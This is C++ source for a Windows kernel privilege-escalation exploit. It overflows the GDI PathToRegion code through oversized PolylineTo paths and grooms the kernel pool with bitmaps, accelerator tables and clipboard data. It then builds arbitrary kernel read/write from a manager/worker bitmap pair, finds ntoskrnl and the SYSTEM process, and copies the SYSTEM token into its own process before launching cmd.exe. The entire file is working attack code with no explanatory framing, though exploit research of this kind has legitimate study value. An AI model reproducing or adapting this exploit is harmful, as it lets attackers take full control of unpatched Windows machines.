#include <iostream>

#include "helpers.h"

HBITMAP WORKER_BITMAP = 0;
HBITMAP MANAGER_BITMAP = 0;
static char BOILERPLATE_DATA[0x1000 - 0x258 + 0x50 + 0x8] = { 0 };

static HBITMAP bitmaps[5000];


void* arbitrarySizeAllocate(unsigned long long size) {
	size = size - 0x30;
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, size);
	memset(GlobalLock(hMem), 0x41, size - 1);
	GlobalUnlock(hMem);
	return SetClipboardData(CF_TEXT, hMem);
}


void groomPool() {
	// Grooming step #1
	// [-------------------------------Gh05 (0xF40)-------------------------------][--Free (0xC0)--]
	HBITMAP bmp;
	for (int k = 0; k < 5000; k++) {
		bmp = CreateBitmap(1640, 2, 1, 8, NULL);
		bitmaps[k] = bmp;
	}

	// Grooming step #2
	// [-------------------------------Gh05 (0xF40)-------------------------------][--Usac (0xC0)--]
	static HACCEL atsToFree[5000];
	char buff[500];
	std::fill(buff, buff + 500, 0x41);
	for (int i = 0; i < 5000; ++i) {
		atsToFree[i] = CreateAcceleratorTableA((LPACCEL)&buff, 22);
	}

	for (int i = 0; i < 1000; i++) {
		arbitrarySizeAllocate(0xC0);
	}

	// Grooming step #3
	// [-------------------------------Free (0xF40)-------------------------------][--Usac (0xC0)--]
	for (int i = 1000; i < 5000; ++i) {
		DeleteObject(bitmaps[i]);
	}

	// Grooming step #4
	// [----------------Uscb (0x9B0)----------------][--------Free (0x590)--------][--Usac (0xC0)--]
	for (int i = 0; i < 6000; i++) {
		arbitrarySizeAllocate(0x9B0);
	}

	// Grooming step #5
	// [----------------Uscb (0x9B0)----------------][--------Gh05 (0x590)--------][--Usac (0xC0)--]
	for (int k = 0; k < 5000; k++) {
		bmp = CreateBitmap(200, 1, 1, 32, NULL);
		bitmaps[k] = bmp;
	}
	
	// Grooming step #6
	// [----------------Uscb (0x9B0)----------------][--------Gh05 (0x590)--------][--Free (0xC0)--]
	for (int i = 3000; i < 5000; ++i) {
		DestroyAcceleratorTable(atsToFree[i]);
	}
}


void exploitOverflow() {
	static POINT points[0x3fe04];
	ULONG x = 0x1;
	ULONG y = 0x1337;


	HDC hdc = GetDC(NULL);
	BeginPath(hdc);

	for (int i = 0; i < 0x3fe04; ++i) {
		points[i].x = x;
		points[i].y = y;
	}
	points[0].y = 0x20;
	points[0].x = 0x20;
	PolylineTo(hdc, points, 0x3FE01);
	points[0].y = y;
	for (int j = 0; j < 0x154; j++) {
		PolylineTo(hdc, points, 0x3FE01);
	}

	const int uniquePointsCount = 0x36;
	for (int i = 0x3fe02 - uniquePointsCount; i < 0x3fe02; ++i) {
		points[i].y = --y;
	}

	PolylineTo(hdc, points, 0x3FE02);
	EndPath(hdc);

	groomPool();
	//DebugBreak();
	PathToRegion(hdc);
}


void mapHdevPage() {
	VOID *fake = VirtualAlloc((void*)0x0000000100000000, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memset(fake, 0x1, 0x100);
}


void resolveWorkerManager() {
	char buff[0x1000] = { 0 };
	unsigned long result = 0;
	//DebugBreak();
	for (int i = 0; i < 5000; ++i) {
		HBITMAP currentBitmap = bitmaps[i];
		result = GetBitmapBits(currentBitmap, 0x1000, buff);
		if (result == 0x1000) {
			MANAGER_BITMAP = currentBitmap;
			WORKER_BITMAP = (HBITMAP)*((unsigned long long*)&buff[0xD98 + 0x10]);
			break;
		}

	}
}

void resolveBoilerplate() {
	char buff[0x1000] = { 0 };
	GetBitmapBits(MANAGER_BITMAP, 0x1000, buff);
	memcpy(BOILERPLATE_DATA, buff, 0xE00);
}

void fixHeaders() {
	char buff[0x1000] = { 0 };
	GetBitmapBits(MANAGER_BITMAP, 0x1000, buff);
	unsigned long long managerBitmapAddress = (unsigned long long)leakSurfaceAddress(MANAGER_BITMAP);

	DebugBreak();
	unsigned long long address = managerBitmapAddress - 0x10;
	writeQword(address, (unsigned long long*)&buff[0xD98]);
	writeQword(address + 8, (unsigned long long*)&buff[0xDA0]);

	address = address & 0xfffffffffffff000;
	writeQword(address, (unsigned long long*)&buff[0x3E8]);
	writeQword(address + 8, (unsigned long long*)&buff[0x3F0]);

	address = managerBitmapAddress;
	writeQword(address, (unsigned long long*)&MANAGER_BITMAP);
	writeQword(address + 8, (unsigned long long*)&buff[0xD98 + 0x18]);
	writeQword(address + 0x10, (unsigned long long*)&buff[0xD98 + 0x20]);
	writeQword(address + 0x18, (unsigned long long*)&buff[0xD98 + 0x28]);
	writeQword(address + 0x20, (unsigned long long*)&buff[0xD98 + 0x30]);
	writeQword(address + 0x28, (unsigned long long*)&buff[0xD98 + 0x38]);
	writeQword(address + 0x30, (unsigned long long*)&buff[0xD98 + 0x40]);
}

unsigned long long readQword(unsigned long long address) {
	unsigned long long data = 0;
	*((unsigned long long*)&BOILERPLATE_DATA[sizeof(BOILERPLATE_DATA) - 8]) = address;
	SetBitmapBits(MANAGER_BITMAP, sizeof(BOILERPLATE_DATA), BOILERPLATE_DATA);
	GetBitmapBits(WORKER_BITMAP, 8, &data);
	return data;
}

void writeQword(unsigned long long address, void* data) {
	*((unsigned long long*)&BOILERPLATE_DATA[sizeof(BOILERPLATE_DATA) - 8]) = address;
	SetBitmapBits(MANAGER_BITMAP, sizeof(BOILERPLATE_DATA), BOILERPLATE_DATA);
	SetBitmapBits(WORKER_BITMAP, 8, data);
}

/**************************************************************/
// Copy-Pasted from HevdGdiExploitation
unsigned long long getNtoskrnlBase() {
	unsigned long long baseAddress = 0;

	unsigned long long ntAddress = readQword(0xffffffffffd00448) - 0x110000;
	unsigned long long signature = 0x00905a4d;
	unsigned long long searchAddress = ntAddress & 0xfffffffffffff000;

	while (true) {
		unsigned long long readData = readQword(searchAddress);
		if ((readData & 0x00000000FFFFFFFF) == signature) {
			baseAddress = searchAddress;
			break;
		}
		searchAddress = searchAddress - 0x1000;
	}

	return baseAddress;
}


unsigned long long PsInitialSystemProcess() {
	unsigned long long systemProcessAddress;
	DebugBreak();
	unsigned long long kernelNtos = getNtoskrnlBase();
	std::cout << "ntoskrnl.exe Base: 0x" << std::hex << kernelNtos << std::endl;
	void* userNtos = LoadLibraryA("ntoskrnl.exe");
	systemProcessAddress = kernelNtos +
		((unsigned long long)GetProcAddress((HMODULE)userNtos, "PsInitialSystemProcess") - (unsigned long long)userNtos);
	std::cout << "System process is at 0x" << std::hex << systemProcessAddress << std::endl;
	return readQword(systemProcessAddress);
}


void elevatePrivileges() {
	unsigned long long systemProcess;
	unsigned long long currentProcess;
	void* systemToken;
	unsigned long pid;
	//unsigned long long tokenOffset = offsetof(_EPROCESS, Token);
	//unsigned long long activeProcessLinksOffset = offsetof(_EPROCESS, ActiveProcessLinks);
	//unsigned long long pidOffset = offsetof(_EPROCESS, UniqueProcessId);
	unsigned long long tokenOffset = 0x358;
	unsigned long long activeProcessLinksOffset = 0x2f0;
	unsigned long long pidOffset = 0x2e8;
	unsigned long currentPid = GetCurrentProcessId();
	
	systemProcess = PsInitialSystemProcess();
	std::cout << "Found system process at 0x" << std::hex << systemProcess << std::endl;
	systemToken = (void*)readQword(systemProcess + tokenOffset);
	std::cout << "Found system token at 0x" << std::hex << systemToken << std::endl;
	
	currentProcess = systemProcess;
	do {
		currentProcess = readQword(currentProcess + activeProcessLinksOffset) - activeProcessLinksOffset;
		pid = readQword(currentProcess + pidOffset);
	} while (pid != currentPid);
	
	std::cout << "Found current process at 0x" << std::hex << currentProcess << std::endl;
	writeQword(currentProcess + tokenOffset, &systemToken);
}


int main() {
	exploitOverflow();
	mapHdevPage();
	resolveWorkerManager();
	resolveBoilerplate();
	fixHeaders();
	elevatePrivileges();

	system("cmd.exe");

	return 0;
}
